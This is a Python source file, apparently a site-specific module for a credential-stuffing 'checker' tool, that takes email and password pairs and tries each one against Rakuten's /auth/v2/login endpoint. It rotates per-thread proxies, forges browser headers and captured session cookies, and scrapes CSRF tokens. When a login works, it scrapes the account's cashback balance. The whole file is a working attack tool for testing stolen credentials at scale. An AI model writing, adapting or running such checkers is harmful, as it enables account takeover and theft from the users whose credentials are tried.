"""
Checker for Rakuten (www.rakuten.com)
Uses the /auth/v2/login endpoint with required flow parameters.
"""
import re
import json
import requests
import threading
from bs4 import BeautifulSoup
from typing import Tuple

BASE_URL = "https://www.rakuten.com"
LOGIN_PAGE = BASE_URL + "/auth/v2/login?flow=flow-rewards-hub-10percent-50cap-7days&variant_type=NO_HEADER_NO_BONUS_LINK&view_mode=external_spacing&bonus_id=NULL_IGNORE&app_name=activation-web&app_version=1.29.0"
LOGIN_POST = BASE_URL + "/auth/v2/login"  # The actual POST endpoint – may be the same URL
TIMEOUT = 30

def check(email: str, password: str) -> Tuple[bool, str]:
    proxy = getattr(threading.current_thread(), 'proxy', None)

    session = requests.Session()
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    # Use the captured cookies and headers as a base
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Origin": BASE_URL,
        "Referer": LOGIN_PAGE,
        "Sec-Fetch-Dest": "iframe",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
    })

    # Set initial cookies (from your capture – some may be session-specific)
    session.cookies.set("AWSALB", "kdR+33GuykNwsFUwyy1szpU34vkHSu2ZDYwW+W2YiAjZ9zqrYSMZDmEO1rnW6SKn380xvSVJmKE5emcA2GfeEKPkTmutih5I+Y0TIQ0+e9Q9aIViwJSEcb8p1DKe")
    session.cookies.set("AWSALBCORS", "kdR+33GuykNwsFUwyy1szpU34vkHSu2ZDYwW+W2YiAjZ9zqrYSMZDmEO1rnW6SKn380xvSVJmKE5emcA2GfeEKPkTmutih5I+Y0TIQ0+e9Q9aIViwJSEcb8p1DKe")
    session.cookies.set("ajs_anonymous_id", "7f39fb71-5e64-468d-b0c9-74f18964eb0b")
    # Add more if needed; but they may be dynamic

    try:
        # Step 1: GET login page to extract any CSRF token or additional cookies
        resp = session.get(LOGIN_PAGE, timeout=TIMEOUT)
        if resp.status_code != 200:
            return False, f"Failed to load login page (HTTP {resp.status_code})"

        # Extract any CSRF token – look for hidden input or meta tag
        soup = BeautifulSoup(resp.text, 'html.parser')
        csrf_token = None
        # Common patterns: name="csrf_token" or data-csrf
        token_input = soup.find('input', {'name': re.compile(r'csrf|token', re.I)})
        if token_input:
            csrf_token = token_input.get('value', '')
        else:
            # Try meta tag
            meta = soup.find('meta', {'name': 'csrf-token'})
            if meta:
                csrf_token = meta.get('content', '')

        # Step 2: Prepare payload
        payload = {
            "email": email,
            "password": password,
            # Add any other required fields (e.g., flow parameters)
            "flow": "flow-rewards-hub-10percent-50cap-7days",
            "variant_type": "NO_HEADER_NO_BONUS_LINK",
            "view_mode": "external_spacing",
            "bonus_id": "NULL_IGNORE",
            "app_name": "activation-web",
            "app_version": "1.29.0",
        }
        if csrf_token:
            # Try to guess the field name – often 'csrf_token' or 'authenticity_token'
            if 'csrf' in resp.text.lower():
                payload['csrf_token'] = csrf_token
            elif 'authenticity' in resp.text.lower():
                payload['authenticity_token'] = csrf_token
            else:
                payload['_token'] = csrf_token

        # Step 3: POST credentials
        post_resp = session.post(LOGIN_POST, data=payload, allow_redirects=True, timeout=TIMEOUT)

        # Step 4: Determine success
        final_url = post_resp.url.lower()
        if "account" in final_url and "login" not in final_url:
            # Success – extract balance
            soup = BeautifulSoup(post_resp.text, 'html.parser')
            balance = None

            # Try to find balance in JSON script tags
            for script in soup.find_all('script', type='application/json'):
                if script.string:
                    try:
                        data = json.loads(script.string)
                        if "cashBackBalance" in data:
                            balance = data["cashBackBalance"]
                            break
                        if "user" in data and "cashBackBalance" in data["user"]:
                            balance = data["user"]["cashBackBalance"]
                            break
                    except:
                        pass

            if not balance:
                # Fallback: regex on HTML
                text = post_resp.text
                patterns = [
                    r'Cash Back[^$]*\$(\d+\.\d{2})',
                    r'Total Earnings[^$]*\$(\d+\.\d{2})',
                    r'cashBackBalance["\']?\s*[:=]\s*["\']?([\d.]+)',
                ]
                for pat in patterns:
                    match = re.search(pat, text, re.IGNORECASE)
                    if match:
                        balance = match.group(1)
                        break

            if balance:
                return True, f"Login successful. Cashback balance: ${balance}"
            else:
                return True, "Login successful (balance not found on this page)"

        # Check for error messages
        html_lower = post_resp.text.lower()
        if "invalid" in html_lower or "incorrect" in html_lower:
            return False, "Invalid credentials"

        # If we are still on the login page, probably failed
        if "login" in final_url:
            return False, "Login failed – still on login page"

        return False, "Login failed – unknown reason"

    except requests.exceptions.Timeout:
        return False, "Request timed out"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, f"Unexpected error: {str(e)}"